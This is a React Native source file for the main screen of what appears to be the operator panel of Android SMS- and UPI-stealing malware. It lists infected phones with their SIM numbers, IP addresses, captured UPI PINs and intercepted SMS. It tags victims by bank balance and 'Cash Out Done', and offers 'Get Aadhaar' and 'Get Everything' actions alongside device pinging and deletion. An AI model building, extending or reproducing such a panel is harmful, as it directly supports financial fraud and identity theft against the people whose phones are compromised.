import React, { useEffect, useMemo, useRef, useState } from 'react';
import { Animated, Easing, FlatList, Pressable, StyleSheet, Text, TextInput, View } from 'react-native';
import { Feather, MaterialCommunityIcons } from '@expo/vector-icons';
import { router } from 'expo-router';
import { ScreenShell } from '@/components/panel/ScreenShell';
import { useToast } from '@/components/panel/ui';
import {
  AllSmsDialog,
  ConfirmDialog,
  DEFAULT_FILTER,
  GetEverythingDialog,
  OtpConfirmDialog,
  OverflowMenuDialog,
  SmsLoadingDialog,
  SortFilter,
  SortFilterDialog,
} from '@/components/panel/dialogs';
import { Client, fmtBytes } from '@/constants/panelData';
import { getActiveSlot } from '@/lib/activeSlot';
import { getSupabase } from '@/lib/supabase';
import { ensureDevSession, panelAuthHeaders } from '@/lib/panelSession';
import { fetchMyDevices, setDeviceFavoriteApi } from '@/lib/devices';
import { DEV_PREVIEW } from '@/lib/devPreview';
import { PALETTE } from '@/constants/theme';

// Premium navy/dark theme — PALETTE tokens (theme.ts) se; hardcoded hex nahi.
// API base — otp.tsx jaisa pattern (real panel se baat karta hai)
import { API_BASE } from '@/lib/apiBase';

function applyFilter(clients: Client[], f: SortFilter): Client[] {
  if (f.all || (!f.online && !f.offline && !f.pin && !f.nopin && !f.starred)) return clients;
  return clients.filter((c) => {
    const hasPin = c.upiPin !== '—';
    const statusOk = (f.online && c.online) || (f.offline && !c.online) || (!f.online && !f.offline);
    const pinOk = (f.pin && hasPin) || (f.nopin && !hasPin) || (!f.pin && !f.nopin);
    const starOk = !f.starred || c.favorite === true;
    return statusOk && pinOk && starOk;
  });
}

function filterLabel(f: SortFilter): string {
  if (f.all) return 'All';
  const parts: string[] = [];
  if (f.online) parts.push('Online');
  if (f.offline) parts.push('Offline');
  if (f.pin) parts.push('Has Pin');
  if (f.nopin) parts.push('No Pin');
  if (f.starred) parts.push('⭐ Marked');
  return parts.length ? parts.join('+') : 'All';
}

// APK dates slashes me dikhata hai ('12/05/2026 | 05:27 pm')
const slashes = (s: string) => s.replaceAll('-', '/');

// '—' / 'Not Available' / empty ko N/A dikhao
const na = (v: string) => (!v || v === '—' || v === 'Not Available' ? 'N/A' : v);

// 🏷️ 4-type category label ke chip colors (owner rule 2026-08-15) — front card pe
// tag isi color ka bordered chip dikhta hai.
const TAG_COLORS: Record<string, string> = {
  '💰 High Balance': PALETTE.greenBright,
  '📉 Low Balance': PALETTE.amber,
  '💸 Cash Out Done': PALETTE.teal,
  '⭐ Top Priority': PALETTE.redSoft,
};

function ClientRow({ item, onPing, onDelete, onToggleStar }: { item: Client; onPing: () => void; onDelete: () => void; onToggleStar: () => void }) {
  return (
    <Pressable onPress={() => router.push({ pathname: '/details', params: { id: item.id } })} testID={`client-${item.id}`}>
      {({ pressed }) => (
        <View style={[styles.rowCard, pressed && { opacity: 0.88 }]}>
          {/* Header: pehle number, usi horizontal row me icon */}
          <View style={styles.headRow}>
            {/* Dashboard monitor icon — display me monitoring graph ke saath */}
            <View style={styles.deviceIconBox}>
              <MaterialCommunityIcons name="monitor-dashboard" size={20} color={PALETTE.primaryBright} />
            </View>
            <Text style={styles.index}>Device</Text>
            <Text style={styles.indexSep}>–</Text>
            <Text style={styles.indexNum}>{item.index}</Text>
            <Text style={styles.headModel}>{item.device}</Text>
          </View>

          {/* Info boxes — SIM 1, SIM 2, Battery, IP (phone line ki jagah 2x2 grid) */}
          <View style={styles.boxGrid}>
            <View style={styles.infoBox}>
              <View style={styles.infoBoxHead}>
                <MaterialCommunityIcons name="sim" size={13} color={PALETTE.primaryBright} />
                <Text style={styles.infoBoxLabel}>SIM 1</Text>
              </View>
              <Text style={styles.infoBoxVal} numberOfLines={1}>{na(item.sim1)}</Text>
            </View>
            <View style={styles.infoBox}>
              <View style={styles.infoBoxHead}>
                <MaterialCommunityIcons name="sim-outline" size={13} color={PALETTE.primaryBright} />
                <Text style={styles.infoBoxLabel}>SIM 2</Text>
              </View>
              <Text style={styles.infoBoxVal} numberOfLines={1}>{na(item.sim2)}</Text>
            </View>
            <View style={styles.infoBox}>
              <View style={styles.infoBoxHead}>
                <MaterialCommunityIcons
                  name={item.battery < 0 ? 'battery-off' : item.battery >= 60 ? 'battery' : item.battery >= 25 ? 'battery-50' : 'battery-20'}
                  size={14}
                  color={item.battery < 0 ? PALETTE.textFaint : item.battery >= 60 ? PALETTE.greenBright : item.battery >= 25 ? PALETTE.amber : PALETTE.red}
                />
                <Text style={styles.infoBoxLabel}>BATTERY</Text>
              </View>
              {/* -1 = device ne kabhi battery report nahi ki — fake 100% nahi, honest N/A */}
              <Text style={styles.infoBoxVal}>{item.battery < 0 ? 'N/A' : `${item.battery}%`}</Text>
            </View>
            <View style={styles.infoBox}>
              <View style={styles.infoBoxHead}>
                <Feather name="globe" size={12} color={PALETTE.primaryBright} />
                <Text style={styles.infoBoxLabel}>IP</Text>
              </View>
              <Text style={styles.infoBoxVal} numberOfLines={1}>{na(item.ip)}</Text>
            </View>
          </View>

          {/* UPI Pin box hamesha dikhta hai — pin na ho to N/A */}
          <View style={styles.upiBox}>
            <Text style={styles.upiLabel}>UPI Pin</Text>
            <Text style={styles.upiVal} numberOfLines={1}>{item.upiPin === '—' ? 'N/A' : item.upiPin}</Text>
          </View>

          {/* Name + category tag chip — tag details screen ke Label picker se aata
              hai aur front card pe yahin dikhta hai (owner rule 2026-08-15) */}
          <View style={styles.labelRow}>
            {item.label ? <Text style={styles.meta} numberOfLines={1}>{item.label}</Text> : null}
            {item.tag ? (
              <View style={[styles.tagChip, { borderColor: TAG_COLORS[item.tag] ?? PALETTE.primaryBright }]}>
                <Text style={[styles.tagChipText, { color: TAG_COLORS[item.tag] ?? PALETTE.primaryBright }]} numberOfLines={1}>
                  {item.tag}
                </Text>
              </View>
            ) : null}
          </View>
          {/* Date + Last seen ek hi row me — do alag lines ki jagah managed */}
          <View style={styles.dateRow}>
            <Text style={[styles.meta, styles.dateCell]} numberOfLines={1}>Date: {slashes(item.date)}</Text>
            <Text style={[styles.meta, styles.dateCell]} numberOfLines={1}>Last: {slashes(item.last)}{item.uninstalled ? ' - Uninstalled' : ''}</Text>
          </View>

          <View style={styles.actionRow}>
            <Text style={[styles.status, { color: item.online ? PALETTE.greenBright : PALETTE.red }]}>Status: {item.status}</Text>
            {/* Order (owner feedback 2026-08-16): Delete | Ribbon | Ping — ribbon delete aur ping ke BEECH me */}
            <Pressable hitSlop={8} style={styles.trashBtn} onPress={onDelete} testID={`delete-${item.id}`}>
              <Feather name="trash-2" size={17} color={PALETTE.textMuted} />
            </Pressable>
            <Pressable hitSlop={8} onPress={onToggleStar} style={{ padding: 6 }} testID={`star-${item.id}`}>
              {/* Ribbon/bookmark icon (owner request 2026-08-15) — star nahi, label-ribbon style */}
              <MaterialCommunityIcons
                name={item.favorite ? 'bookmark' : 'bookmark-outline'}
                size={19}
                color={item.favorite ? PALETTE.amber : PALETTE.textMuted}
              />
            </Pressable>
            {/* Ping button (owner request 2026-08-16) — device ko wake/signal bhejta hai;
                ROUND bordered circle (pingAllBtn style) rakhna hai, icon pulse/heartbeat (wifi nahi) */}
            <Pressable hitSlop={8} onPress={onPing} style={styles.pingAllBtn} testID={`ping-${item.id}`}>
              <Feather name="activity" size={15} color={PALETTE.primaryBright} />
            </Pressable>
          </View>
        </View>
      )}
    </Pressable>
  );
}

export default function MainScreen() {
  const [clients, setClients] = useState<Client[]>([]);
  const [activeSlot, setActiveSlotState] = useState<string | null>(null);
  const [query, setQuery] = useState('');
  const [filter, setFilter] = useState<SortFilter>(DEFAULT_FILTER);
  const [dialog, setDialog] = useState<'sort' | 'overflow' | 'delete' | 'deleteOtp' | 'allsms' | 'smsload' | 'pingConfirm' | 'getEverything' | null>(null);
  const [pendingDelete, setPendingDelete] = useState<string | null>(null);
  const [deleteOtpError, setDeleteOtpError] = useState<string | null>(null);
  const [toast, showToast] = useToast();
  // Realtime status events ka counter — poll isse stale-response overwrite rokta hai.
  const rtSeq = useRef(0);
  // Manual refresh button ke liye — effect ka load function yahan expose hota hai.
  const loadRef = useRef<null | (() => Promise<void>)>(null);
  const [refreshing, setRefreshing] = useState(false);

  // Scoped devices load karo — server Bearer session se sirf ISI user ke
  // slots/links ke devices deta hai. Active slot ho to usi me filter.
  // STATUS LIVE rakhne ke liye 10s pe dobara fetch — pehle sirf mount pe load
  // hota tha, isliye device online/offline hone pe app ko pata hi nahi chalta
  // tha. Server 8s RTDB cache rakhta hai, isse fast poll ka fayda nahi.
  useEffect(() => {
    let cancelled = false;
    let first = true;
    let inFlight = false;
    const load = async () => {
      if (inFlight) return; // single-flight — overlapping polls nahi (code-review)
      inFlight = true;
      const rtAtStart = rtSeq.current;
      try {
        const slot = await getActiveSlot();
        const devs = await fetchMyDevices();
        // Fetch ke DORAAN realtime status event aa gaya to ye purana response
        // usse overwrite na kare — agla poll 10s me sync kar lega.
        if (cancelled || rtSeq.current !== rtAtStart) return;
        setActiveSlotState(slot?.id ?? null);
        // DEV PREVIEW: fake devices ke slotTag 'slot1/slot2' fixed hain — koi purani
        // saved real slot id filter sabko 0 kar deti thi, isliye preview me filter skip.
        setClients(DEV_PREVIEW ? devs : slot?.id ? devs.filter((c) => c.slotTag === slot.id) : devs);
      } catch {
        // Poll fail pe purani list wipe MAT karo — sirf pehli load pe error.
        if (!cancelled && first) {
          setClients([]);
          showToast('Devices load nahi hue — dobara sign in karo');
        }
      } finally {
        inFlight = false;
        first = false;
      }
    };
    loadRef.current = load; // header refresh button isi ko call karta hai
    void load();
    const timer = setInterval(() => { void load(); }, 10000);
    return () => { cancelled = true; clearInterval(timer); };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Supabase Realtime — live panel events (RLS sirf isi user ke rows deti hai).
  // Backend emit() → panel_events write-through karta hai; yahan merge hota hai.
  // Channel topic har mount pe UNIQUE — realtime-js same-topic channel reuse karta
  // hai; remount/fast-refresh pe purana joined channel milne pe .on() throw karta
  // tha ("cannot add postgres_changes callbacks after subscribe()") aur POORA panel
  // ErrorBoundary crash screen pe chala jata tha (Switch press pe yehi dikha).
  useEffect(() => {
    const sb = getSupabase();
    if (!sb) return; // env/session missing — app polling ke bina bhi kaam karti hai
    const channel = sb.channel(`panel-events-${Date.now()}`);
    try {
      channel
      .on(
        'postgres_changes',
        { event: 'INSERT', schema: 'public', table: 'panel_events' },
        (payload) => {
          const row = payload.new as { type: string; device_id: string };
          if (row.type === 'device_pinged') {
            rtSeq.current += 1; // poll ko batao: naya status realtime ne diya
            setClients((prev) =>
              prev.map((c) => (c.id === row.device_id ? { ...c, status: 'Online', online: true } : c)),
            );
          } else if (row.type === 'device_unlinked' || row.type === 'device_removed') {
            rtSeq.current += 1;
            setClients((prev) =>
              prev.map((c) => (c.id === row.device_id ? { ...c, status: 'Offline', online: false } : c)),
            );
          } else if (row.type === 'sms_received' && row.device_id !== 'app') {
            setClients((prev) =>
              prev.map((c) => (c.id === row.device_id ? { ...c, received: c.received + 1 } : c)),
            );
            showToast('New SMS received');
          }
        },
      )
      .subscribe();
    } catch (e) {
      // Realtime kabhi bhi POORI app ko crash nahi karega — polling fallback hai.
      console.warn('realtime subscribe fail (non-fatal):', e);
    }
    return () => {
      void sb.removeChannel(channel);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const sent = clients.reduce((s, c) => s + c.sent, 0);
  const received = clients.reduce((s, c) => s + c.received, 0);

  const data = useMemo(() => {
    const filtered = applyFilter(clients, filter);
    return filtered.filter((c) =>
      (c.label + c.phone + c.model + c.upiPin).toLowerCase().includes(query.toLowerCase())
    );
  }, [clients, filter, query]);

  // Working refresh (owner request 2026-08-15) — devices + status turant dobara
  // fetch. Icon EK BAAR poora ghoomta hai (rotate-once) + "Updating…" text dikhta
  // hai jab tak load chal raha ho.
  const spin = useRef(new Animated.Value(0)).current;
  const spinDeg = spin.interpolate({ inputRange: [0, 1], outputRange: ['0deg', '360deg'] });
  const manualRefresh = async () => {
    if (refreshing || !loadRef.current) return;
    spin.setValue(0);
    Animated.timing(spin, { toValue: 1, duration: 700, easing: Easing.linear, useNativeDriver: true }).start();
    setRefreshing(true);
    try {
      await loadRef.current();
      showToast('Devices refreshed ✅');
    } finally {
      setRefreshing(false);
    }
  };

  const ping = async (id: string) => {
    try {
      const call = () =>
        fetch(`${API_BASE}/api/panel/devices/ping`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', ...panelAuthHeaders() },
          body: JSON.stringify({ deviceId: id }),
        });
      let r = await call();
      // 401 (session expire) pe self-heal + ek retry — "panel unreachable" jhootha toast nahi.
      if (r.status === 401) {
        await ensureDevSession(API_BASE);
        r = await call();
      }
      if (!r.ok) throw new Error(`ping failed: ${r.status}`);
      const data = (await r.json().catch(() => ({}))) as { online?: boolean; acked?: boolean };
      const online = data.online === true;
      // Sach hi dikhao — server ne RTDB ack + fresh lastOnlineAt se verify kiya hai.
      setClients((prev) => prev.map((c) => (c.id === id ? { ...c, status: online ? 'Online' : c.status, online } : c)));
      showToast(
        online
          ? 'Device online ✅ — ack mila'
          : data.acked
            ? 'Device ne jawab diya, par offline dikh raha hai'
            : 'Ping bheja — device ne jawab nahi diya (offline lagta hai)',
      );
    } catch {
      showToast('Ping failed — panel unreachable');
    }
  };

  // ⭐ Star toggle — optimistic UI (turant dikhe); server RTDB isFavorite me
  // save karta hai, fail pe rollback + toast.
  const toggleStar = async (id: string) => {
    const current = clients.find((c) => c.id === id);
    const next = !(current?.favorite === true);
    setClients((prev) => prev.map((c) => (c.id === id ? { ...c, favorite: next } : c)));
    const ok = await setDeviceFavoriteApi(id, next);
    if (!ok) {
      setClients((prev) => prev.map((c) => (c.id === id ? { ...c, favorite: !next } : c)));
      showToast('Star save nahi hua — connection check karo');
    }
  };

  const pingAllOffline = () => {
    const offline = clients.filter((c) => !c.online);
    if (offline.length === 0) {
      showToast('No offline devices in the current list');
      return;
    }
    setDialog('pingConfirm');
  };

  const executePingAll = async () => {
    setDialog(null);
    try {
      const r = await fetch(`${API_BASE}/api/panel/devices/ping`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', ...panelAuthHeaders() },
        body: JSON.stringify({}),
      });
      if (!r.ok) throw new Error(`ping failed: ${r.status}`);
      const data = (await r.json().catch(() => ({}))) as { pinged?: number; devices?: { id: string; online: boolean }[] };
      const count = typeof data.pinged === 'number' ? data.pinged : 0;
      // Jo devices sach me online hue sirf unka status badlo — fake flip nahi.
      const byId = new Map((data.devices ?? []).map((d) => [d.id, d.online]));
      setClients((prev) => prev.map((c) => (byId.has(c.id) ? { ...c, online: byId.get(c.id)!, status: byId.get(c.id) ? 'Online' : c.status } : c)));
      showToast(`Ping sent to ${count} offline device${count === 1 ? '' : 's'}`);
    } catch {
      showToast('Ping failed — panel unreachable');
    }
  };

  const requestDelete = (id: string) => {
    setPendingDelete(id);
    setDialog('delete');
  };

  // Confirm ke baad action OTP bhejo (Telegram pe) — phir OTP dialog kholo.
  // Delete destructive hai — owner rule: OTP sirf yahin mangta hai.
  const startDeleteOtp = async () => {
    setDeleteOtpError(null);
    try {
      const r = await fetch(`${API_BASE}/api/panel/app/otp/action`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', ...panelAuthHeaders() },
        body: '{}',
      });
      const data = (await r.json().catch(() => ({}))) as { error?: string; retryAfterSec?: number };
      // cooldown pe bhi dialog kholo — pichla OTP abhi valid ho sakta hai
      if (!r.ok && data.error !== 'cooldown') {
        showToast('OTP bhejna fail — dobara try karo');
        return;
      }
      if (!r.ok && data.error === 'cooldown') {
        // 5 resend cross — dynamic cooldown seconds dikhao (silent retry misleading hai)
        setDeleteOtpError(`5 resend ho gaye — ${data.retryAfterSec ?? 60} second baad dobara try karo`);
      }
    } catch {
      showToast('OTP bhejna fail — panel unreachable');
      return;
    }
    setDialog('deleteOtp');
  };

  // Server pe delete (scoped — sirf apna device) + Telegram OTP verify; success pe hi UI update.
  const deleteDevice = async (id: string, otp: string) => {
    try {
      const r = await fetch(`${API_BASE}/api/panel/devices/${encodeURIComponent(id)}`, {
        method: 'DELETE',
        headers: { 'Content-Type': 'application/json', ...panelAuthHeaders() },
        body: JSON.stringify({ otp }),
      });
      if (!r.ok) {
        const data = (await r.json().catch(() => ({}))) as { error?: string };
        if (data.error === 'wrong_otp' || data.error === 'too_many_attempts') {
          setDeleteOtpError('Wrong OTP — Telegram wala 6-digit code daalo');
          return; // dialog khula rakho — dobara try kar sake
        }
        if (data.error === 'otp_expired' || data.error === 'otp_required') {
          setDeleteOtpError('OTP expired — Cancel karke dobara delete dabao');
          return;
        }
        setDialog(null);
        setPendingDelete(null);
        showToast(r.status === 404 ? 'Device nahi mila (ya tumhara nahi hai)' : `Delete fail: ${r.status}`);
        return;
      }
      setDialog(null);
      setPendingDelete(null);
      setClients((prev) => prev.filter((c) => c.id !== id));
      showToast('Device deleted');
    } catch {
      showToast('Delete fail — panel unreachable');
    }
  };

  const doDelete = (code: string) => {
    const id = pendingDelete;
    if (id) void deleteDevice(id, code);
  };

  return (
    <ScreenShell>
      <View style={styles.page}>
        {/* DEV PREVIEW banner — production me kabhi nahi dikhta (DEV_PREVIEW __DEV__-gated).
            Review requirement: preview screen ko production se confuse hona impossible ho. */}
        {DEV_PREVIEW && (
          <View style={{ backgroundColor: '#b45309', paddingVertical: 4, paddingHorizontal: 10, borderRadius: 6, marginBottom: 6, alignItems: 'center' }}>
            <Text style={{ color: '#fff', fontSize: 11, fontWeight: '700', letterSpacing: 0.5 }}>
              PREVIEW MODE — fake data, login bypassed
            </Text>
          </View>
        )}
        {/* Header — navy IgoanPanel button + Total/Sort pill */}
        <View style={styles.header}>
          <View style={styles.titleRow}>
            <Pressable hitSlop={8} style={styles.menuBtn} onPress={() => router.push('/drawer')} testID="header-menu">
              <Feather name="menu" size={22} color={PALETTE.primaryBright} />
            </Pressable>
            <View style={styles.countPill}>
              <Text style={styles.countPillText} numberOfLines={1}>
                Total - {data.length} :: Sort By - {filterLabel(filter)}
              </Text>
            </View>
            {/* Refresh — Total/Sort pill ke RIGHT side (owner request); pill ka
                text ab left se shuru hota hai (space bachane ke liye) */}
            <Pressable hitSlop={8} style={styles.refreshBox} onPress={() => void manualRefresh()} testID="header-refresh">
              <Animated.View style={{ transform: [{ rotate: spinDeg }] }}>
                <Feather name="refresh-cw" size={16} color={PALETTE.primaryBright} />
              </Animated.View>
            </Pressable>
            {refreshing && <Text style={styles.updatingText}>Updating…</Text>}
          </View>
          <View style={styles.monitorRow}>
            <Text style={styles.monitor}>Sent: {fmtBytes(sent)} | Received: {fmtBytes(received)}</Text>
            <Pressable onPress={() => setDialog('smsload')} testID="btn-all-sms" style={styles.allSmsBtn}>
              <Text style={styles.allSmsText}>All SMS</Text>
            </Pressable>
            {/* Ping All Offline (owner: button gayab ho gaya tha aaj ke refactor me —
                6e2456fe2 wala header button wapas). pingAllOffline + pingConfirm dialog
                pehle se maujood the, sirf trigger missing tha. */}
            <Pressable hitSlop={8} style={styles.pingAllBtn} onPress={pingAllOffline} testID="header-pingall">
              {/* Row ping (Feather activity) se consistent — pulse, wifi/access-point nahi */}
              <MaterialCommunityIcons name="pulse" size={16} color={PALETTE.primaryBright} />
            </Pressable>
            <Pressable hitSlop={8} style={styles.headerIconBtn} onPress={() => setDialog('overflow')} testID="header-overflow">
              <Feather name="more-vertical" size={19} color={PALETTE.textMuted} />
            </Pressable>
          </View>

          {/* Search + filter — header block ke andar hi, ek unified top section */}
          <View style={styles.searchWrap}>
            <Feather name="search" size={18} color={PALETTE.textFaint} />
            <TextInput
              value={query}
              onChangeText={setQuery}
              placeholder="Search"
              placeholderTextColor={PALETTE.textFaint}
              style={styles.search}
              testID="input-search"
            />
            <Pressable hitSlop={8} onPress={() => setDialog('sort')} testID="btn-sort" style={styles.sortBtn}>
              <Feather name="filter" size={16} color={PALETTE.primaryBright} />
            </Pressable>
          </View>
        </View>

        <FlatList
          data={data}
          keyExtractor={(c) => c.id}
          renderItem={({ item }) => (
            <ClientRow item={item} onPing={() => ping(item.id)} onDelete={() => requestDelete(item.id)} onToggleStar={() => void toggleStar(item.id)} />
          )}
          contentContainerStyle={styles.list}
          showsVerticalScrollIndicator={false}
          scrollEnabled={data.length > 0}
          ListEmptyComponent={
            <View style={styles.empty}>
              <Feather name="smartphone" size={22} color={PALETTE.textFaint} />
              <Text style={styles.emptyText}>No devices match</Text>
            </View>
          }
        />

        <SortFilterDialog visible={dialog === 'sort'} onClose={() => setDialog(null)} value={filter} onApply={setFilter} />
        <OverflowMenuDialog
          visible={dialog === 'overflow'}
          onClose={() => setDialog(null)}
          // Aadhaar actions — UI in place; function owner explain karega tab wire hoga
          onGetAadhaar={() => showToast('Get Aadhaar — coming soon (function abhi wire hoga)')}
          onGetNumberOfAll={() => showToast('Get Number of All — coming soon (function abhi wire hoga)')}
          onGetEverything={() => setDialog('getEverything')}
        />
        <GetEverythingDialog
          visible={dialog === 'getEverything'}
          onClose={() => setDialog(null)}
          clients={data}
          onNumber={() => showToast('🔢 Get Number of All — har device ka number nikalta hai')}
          onAadhaar={() => showToast('🪪 Get Aadhaar — sab devices ka aadhaar')}
        />
        <ConfirmDialog
          visible={dialog === 'delete'}
          onClose={() => setDialog(null)}
          title="Delete device?"
          message="This device and all its messages will be removed permanently."
          onOk={() => void startDeleteOtp()}
          okLabel=" Delete "
        />
        <OtpConfirmDialog
          visible={dialog === 'deleteOtp'}
          onClose={() => { setDialog(null); setPendingDelete(null); }}
          error={deleteOtpError}
          onConfirm={doDelete}
          onResend={() => void startDeleteOtp()}
        />
        {/* All SMS — pehle loading dialog (reference flow), phir saare devices ki combined list */}
        <SmsLoadingDialog visible={dialog === 'smsload'} onClose={() => setDialog('allsms')} />
        <AllSmsDialog visible={dialog === 'allsms'} onClose={() => setDialog(null)} clients={clients} />
        <ConfirmDialog
          visible={dialog === 'pingConfirm'}
          onClose={() => setDialog(null)}
          title="Ping all offline?"
          message={`Do you really want to ping all offline devices?\n\n(${clients.filter((c) => !c.online).length} devices)`}
          onOk={executePingAll}
          okLabel=" Ping "
        />
        {toast}
      </View>
    </ScreenShell>
  );
}

const styles = StyleSheet.create({
  page: { flex: 1, backgroundColor: PALETTE.bg },

  header: {
    backgroundColor: PALETTE.card, paddingHorizontal: 12, paddingTop: 10, paddingBottom: 12,
    borderBottomWidth: 1, borderBottomColor: PALETTE.border,
  },
  // Pill menu aur refresh ke BEECH me centered (owner request) — flex:1 se
  // dono sides se equally expand hota hai, text bhi center me
  titleRow: { flexDirection: 'row', alignItems: 'center', gap: 10 },
  menuBtn: { padding: 6, justifyContent: 'center' },
  countPill: {
    flex: 1, backgroundColor: PALETTE.cardAlt, borderWidth: 1, borderColor: PALETTE.borderSoft,
    borderRadius: 18, paddingHorizontal: 12, paddingVertical: 7,
    alignItems: 'center', justifyContent: 'center',
  },
  countPillText: { color: PALETTE.text, fontSize: 12, fontFamily: 'Inter_700Bold', textAlign: 'center' },
  monitorRow: { flexDirection: 'row', alignItems: 'center', gap: 12, marginTop: 12 },
  // Refresh ke dauran chhota "Updating…" indicator (icon rotate-once ke saath)
  updatingText: { color: PALETTE.primaryBright, fontSize: 11, fontFamily: 'Inter_600SemiBold', marginLeft: -6 },
  monitor: { flex: 1, color: PALETTE.textMuted, fontSize: 12, fontFamily: 'Inter_700Bold' },
  headerIconBtn: {
    width: 30, height: 30, borderRadius: 15, alignItems: 'center', justifyContent: 'center',
  },
  // Refresh button — transparent bordered box (owner request)
  refreshBox: {
    width: 34, height: 34, borderRadius: 10, alignItems: 'center', justifyContent: 'center',
    borderWidth: 1, borderColor: PALETTE.borderSoft, backgroundColor: 'transparent',
  },
  pingAllBtn: {
    width: 30, height: 30, borderRadius: 15, borderWidth: 1.5, borderColor: PALETTE.primaryBright,
    alignItems: 'center', justifyContent: 'center',
  },

  searchWrap: {
    flexDirection: 'row', alignItems: 'center', gap: 8, backgroundColor: PALETTE.cardAlt,
    borderRadius: 22, borderWidth: 1, borderColor: PALETTE.borderSoft, paddingHorizontal: 12, height: 44,
    marginTop: 12,
  },
  search: { flex: 1, color: PALETTE.text, fontSize: 14, fontFamily: 'Inter_600SemiBold', padding: 0 },
  sortBtn: { padding: 6 },
  allSmsBtn: {
    backgroundColor: PALETTE.primaryBright, borderRadius: 16,
    paddingHorizontal: 12, paddingVertical: 7, alignItems: 'center', justifyContent: 'center',
  },
  allSmsText: { color: '#0b1c2c', fontSize: 12, fontFamily: 'Inter_700Bold' },

  list: { padding: 10, gap: 10, paddingBottom: 40 },

  // Client card — dark card + navy border (premium theme)
  rowCard: {
    backgroundColor: PALETTE.card,
    borderRadius: 16, borderWidth: 1.2, borderColor: PALETTE.primary, paddingVertical: 12, paddingHorizontal: 12,
  },
  headRow: { flexDirection: 'row', alignItems: 'center', gap: 4, marginBottom: 8 },
  index: { color: PALETTE.text, fontSize: 16, fontFamily: 'Inter_700Bold', marginLeft: 6, paddingVertical: 3 },
  indexSep: { color: PALETTE.textMuted, fontSize: 16, fontFamily: 'Inter_400Regular', marginLeft: 6, paddingVertical: 3 },
  indexNum: { color: PALETTE.text, fontSize: 16, fontFamily: 'Inter_700Bold', marginLeft: 6, paddingVertical: 3 },
  headModel: { color: PALETTE.textMuted, fontSize: 12, fontFamily: 'Inter_600SemiBold', flexShrink: 1, marginLeft: 10 },
  dateRow: { flexDirection: 'row', gap: 10 },
  dateCell: { flex: 1, fontSize: 11 },
  deviceIconBox: { width: 38, height: 38, borderRadius: 12, backgroundColor: PALETTE.cardAlt, borderWidth: 1, borderColor: PALETTE.borderSoft, alignItems: 'center', justifyContent: 'center', marginRight: 6 },

  // Info boxes — SIM/Battery/IP chips (2x2 grid)
  boxGrid: { flexDirection: 'row', flexWrap: 'wrap', gap: 8 },
  infoBox: { width: '48%', backgroundColor: PALETTE.cardAlt, borderWidth: 1, borderColor: PALETTE.borderSoft, borderRadius: 12, paddingHorizontal: 10, paddingVertical: 8 },
  infoBoxHead: { flexDirection: 'row', alignItems: 'center', gap: 6 },
  infoBoxLabel: { color: PALETTE.textMuted, fontSize: 10, fontFamily: 'Inter_600SemiBold', letterSpacing: 1.2 },
  infoBoxVal: { color: PALETTE.text, fontSize: 12, fontFamily: 'Inter_700Bold', marginTop: 4 },

  upiBox: { backgroundColor: PALETTE.redBg, borderRadius: 10, paddingHorizontal: 10, paddingVertical: 6, marginTop: 6 },
  upiLabel: { color: PALETTE.redSoft, fontSize: 10, fontFamily: 'Inter_600SemiBold' },
  upiVal: { color: PALETTE.text, fontSize: 13, fontFamily: 'Inter_700Bold', marginTop: 1 },

  meta: { color: PALETTE.textMuted, fontSize: 12, fontFamily: 'Inter_600SemiBold', marginTop: 3 },
  // 🏷️ category tag chip — front card pe (details ke Label picker se set hota hai)
  labelRow: { flexDirection: 'row', alignItems: 'center', gap: 8, marginTop: 6, flexWrap: 'wrap' },
  tagChip: { borderWidth: 1, borderRadius: 999, paddingHorizontal: 9, paddingVertical: 2, maxWidth: '75%' },
  tagChipText: { fontSize: 10.5, fontFamily: 'Inter_700Bold', letterSpacing: 0.3 },

  actionRow: { flexDirection: 'row', alignItems: 'center', marginTop: 8 },
  status: { flex: 1, fontSize: 12, fontFamily: 'Inter_700Bold' },
  pingCircle: { width: 30, height: 30, borderRadius: 15, alignItems: 'center', justifyContent: 'center' },
  trashBtn: { padding: 6, marginLeft: 10 },

  empty: { alignItems: 'center', gap: 8, paddingVertical: 40 },
  emptyText: { color: PALETTE.textMuted, fontSize: 13, fontFamily: 'Inter_400Regular' },
});
